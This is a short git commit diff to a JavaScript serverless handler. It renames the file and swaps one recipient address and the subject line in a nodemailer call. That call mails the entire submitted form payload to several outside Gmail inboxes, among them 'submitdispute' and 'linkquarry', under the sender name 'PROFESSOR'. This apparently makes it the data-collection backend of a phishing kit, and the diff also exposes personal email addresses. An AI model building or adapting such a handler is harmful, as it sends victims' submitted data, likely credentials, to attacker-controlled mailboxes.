306226c25b2d179d38d9f7fd3fcebf4d5df2974e
zm9807350 <zm9807350@gmail.com>
2026-03-07 14:21:21 +0500

    Update and rename rizwan.js to Sultan.js

--- Sultan.js
+++ Sultan.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,rizwanniz182@gmail.com",
-      subject: "rizwan",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,jolinakims256@gmail.com",
+      subject: "Sultan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
